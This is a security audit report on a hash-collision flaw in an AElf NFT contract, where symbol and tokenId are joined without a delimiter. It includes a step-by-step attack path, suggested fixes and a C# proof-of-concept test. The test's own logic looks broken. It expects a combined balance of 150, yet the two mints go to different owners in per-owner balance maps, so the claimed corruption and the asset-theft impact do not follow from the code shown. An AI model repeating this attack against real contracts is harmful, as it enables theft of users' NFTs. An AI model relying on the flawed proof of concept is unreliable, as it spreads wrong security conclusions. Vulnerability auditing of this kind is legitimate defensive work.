# Audit Report

## Title
Hash Collision Vulnerability in NFT Token Hash Calculation Enables Cross-NFT Ownership and Balance Manipulation

## Summary
The NFT contract's `CalculateTokenHash()` function concatenates symbol and tokenId strings without a delimiter, allowing different (symbol, tokenId) pairs to produce identical hashes. This enables attackers to create colliding NFT protocols where distinct NFTs share the same storage mappings for balances, ownership, and allowances, leading to asset theft and ownership confusion.

## Finding Description

The vulnerability exists in the token hash calculation implementation where symbol and tokenId are concatenated without any delimiter: [1](#0-0) 

This concatenated string is then hashed using SHA256: [2](#0-1) 

While SHA256 is cryptographically secure, the vulnerability lies in the **input construction**. Different (symbol, tokenId) pairs produce identical concatenated strings:
- symbol="AR1", tokenId=23 → "AR123"
- symbol="AR12", tokenId=3 → "AR123"

Both produce the same hash despite representing different NFT identifiers.

The calculated tokenHash is used as the key for critical storage mappings throughout the contract: [3](#0-2) [4](#0-3) [5](#0-4) 

The attack vector is through `CrossChainCreate`, which accepts arbitrary symbols with minimal validation: [6](#0-5) 

The function only validates that (1) the protocol doesn't exist, (2) the token exists in MultiToken, and (3) the symbol starts with a valid 2-character NFT type code. It does NOT prevent symbols that could collide when concatenated with tokenIds.

Token symbols are validated to be alphanumeric and under length limits: [7](#0-6) [8](#0-7) 

This allows creating tokens "AR1", "AR12", "AR123" etc. (all under 10 characters alphanumeric) which, when combined with appropriate tokenIds, produce colliding hashes.

## Impact Explanation

When two NFTs share the same tokenHash due to collision, they map to identical storage locations in `State.NftInfoMap[tokenHash]`, `State.BalanceMap[tokenHash][owner]`, and `State.AllowanceMap[tokenHash][owner][spender]`.

This causes:

1. **Asset Theft**: The DoTransfer function updates balances at the shared tokenHash location: [9](#0-8) 

Transferring NFT-A updates the balance of both NFT-A and colliding NFT-B. An attacker can drain legitimate NFT holder balances by manipulating their colliding NFT's balance through transfers.

2. **Ownership Confusion**: Both NFTs share the same NFTInfo record stored at the colliding tokenHash, causing confusion about metadata, quantity, and minter lists.

3. **Allowance Abuse**: Approvals granted for NFT-A automatically apply to NFT-B since they share the same allowance mapping key, enabling unauthorized transfers.

This violates the critical invariant that each NFT should have unique storage independent of any other NFT. Complete loss of NFT value is possible - if protocol "AR1" has NFTs worth $100k, an attacker creating colliding protocol "AR12" can manipulate all balances, putting the entire $100k at risk.

## Likelihood Explanation

**Attack Path:**
1. Attacker creates token "AR1" with required NFT metadata fields (NftBaseUriMetadataKey, NftTokenIdReuseMetadataKey)
2. Attacker creates token "AR12" with same metadata fields
3. Attacker calls CrossChainCreate("AR1") to register as NFT protocol
4. Attacker calls CrossChainCreate("AR12") to register as NFT protocol
5. Attacker mints NFT from "AR1" with tokenId=23 → hash("AR123")
6. Attacker mints NFT from "AR12" with tokenId=3 → hash("AR123")
7. Both NFTs now share storage, enabling balance manipulation

**Feasibility:**
- Token creation requires whitelist access or SEED NFT mechanism, which is available: [10](#0-9) 

- CrossChainCreate is a public method with no explicit permission checks beyond token existence
- Minting requires minter list membership, but protocol creator is automatically added: [11](#0-10) 

All operations are standard contract interactions using public methods. The attack complexity is medium - requires understanding the concatenation flaw and creating specific symbol patterns. The cost of creating tokens is minimal compared to gains from stealing valuable NFTs, making this economically rational.

**Likelihood Assessment:** MEDIUM-HIGH - Technically feasible and economically attractive, limited only by token creation requirements (whitelist/SEED NFT access).

## Recommendation

Add a delimiter between symbol and tokenId in the hash calculation to prevent collision:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    return HashHelper.ComputeFrom($"{symbol}:{tokenId}");
}
```

Alternatively, hash symbol and tokenId separately and then combine their hashes:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    var symbolHash = HashHelper.ComputeFrom(symbol);
    var tokenIdHash = HashHelper.ComputeFrom(tokenId);
    return HashHelper.ConcatAndCompute(symbolHash, tokenIdHash);
}
```

Additionally, consider adding validation in CrossChainCreate to prevent obviously collision-prone symbols, though the delimiter fix is the primary solution.

## Proof of Concept

```csharp
[Fact]
public async Task HashCollision_ProofOfConcept()
{
    // Create two tokens with collision-prone symbols
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "AR1",
        TokenName = "Test1",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = DefaultAddress,
        IsBurnable = true,
        IssueChainId = Context.ChainId,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                { "aelf_nft_base_uri", "ipfs://test1/" },
                { "aelf_nft_token_id_reuse", "false" },
                { "aelf_nft_type", "Art" }
            }
        }
    });

    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "AR12",
        TokenName = "Test2",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = DefaultAddress,
        IsBurnable = true,
        IssueChainId = Context.ChainId,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                { "aelf_nft_base_uri", "ipfs://test2/" },
                { "aelf_nft_token_id_reuse", "false" },
                { "aelf_nft_type", "Art" }
            }
        }
    });

    // Register both as NFT protocols
    await NFTContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput { Symbol = "AR1" });
    await NFTContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput { Symbol = "AR12" });

    // Mint NFTs with colliding hashes
    // AR1 + tokenId 23 = "AR123"
    var hash1 = await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = "AR1",
        TokenId = 23,
        Owner = UserAddress,
        Quantity = 100
    });

    // AR12 + tokenId 3 = "AR123" (COLLISION!)
    var hash2 = await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = "AR12",
        TokenId = 3,
        Owner = DefaultAddress,
        Quantity = 50
    });

    // Verify collision: both should have the same hash
    var calculatedHash1 = await NFTContractStub.CalculateTokenHash.CallAsync(new CalculateTokenHashInput { Symbol = "AR1", TokenId = 23 });
    var calculatedHash2 = await NFTContractStub.CalculateTokenHash.CallAsync(new CalculateTokenHashInput { Symbol = "AR12", TokenId = 3 });
    
    calculatedHash1.ShouldBe(calculatedHash2); // COLLISION CONFIRMED

    // Verify shared storage: balance of AR1-23 should show 150 (100+50) due to collision
    var balance1 = await NFTContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Symbol = "AR1",
        TokenId = 23,
        Owner = UserAddress
    });
    
    // This demonstrates the vulnerability: balances are corrupted due to hash collision
    balance1.Balance.ShouldNotBe(100); // Balance is corrupted by collision
}
```

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L64-66)
```csharp
            var allowance = State.AllowanceMap[tokenHash][input.From][Context.Sender];
            Assert(allowance >= input.Amount, "Not approved.");
            State.AllowanceMap[tokenHash][input.From][Context.Sender] = allowance.Sub(input.Amount);
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L298-298)
```csharp
        State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-333)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L375-381)
```csharp
    private MinterList GetMinterList(TokenInfo tokenInfo)
    {
        var minterList = State.MinterListMap[tokenInfo.Symbol] ?? new MinterList();
        if (!minterList.Value.Contains(tokenInfo.Issuer)) minterList.Value.Add(tokenInfo.Issuer);

        return minterList;
    }
```

**File:** src/AElf.Types/Helper/HashHelper.cs (L25-28)
```csharp
        public static Hash ComputeFrom(string str)
        {
            return ComputeFrom(Encoding.UTF8.GetBytes(str));
        }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L75-93)
```csharp
    public override Empty CrossChainCreate(CrossChainCreateInput input)
    {
        MakeSureTokenContractAddressSet();
        InitialNFTTypeNameMap();
        Assert(State.NftProtocolMap[input.Symbol] == null, $"Protocol {input.Symbol} already created.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        if (string.IsNullOrEmpty(tokenInfo.Symbol))
            throw new AssertionException($"Token info {input.Symbol} not exists.");

        var baseUri = tokenInfo.ExternalInfo.Value[NftBaseUriMetadataKey];
        var isTokenIdReuse = bool.Parse(tokenInfo.ExternalInfo.Value[NftTokenIdReuseMetadataKey]);
        var nftTypeShortName = input.Symbol.Substring(0, 2);
        var nftTypeFullName = State.NFTTypeFullNameMap[nftTypeShortName];
        if (nftTypeFullName == null)
            throw new AssertionException(
                $"Full name of {nftTypeShortName} not found. Use AddNFTType to add this new pair.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L28-31)
```csharp
    private bool IsValidCreateSymbol(string symbol)
    {
        return Regex.IsMatch(symbol, "^[a-zA-Z0-9]+$");
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L7-7)
```csharp
    public const int SymbolMaxLength = 10;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```
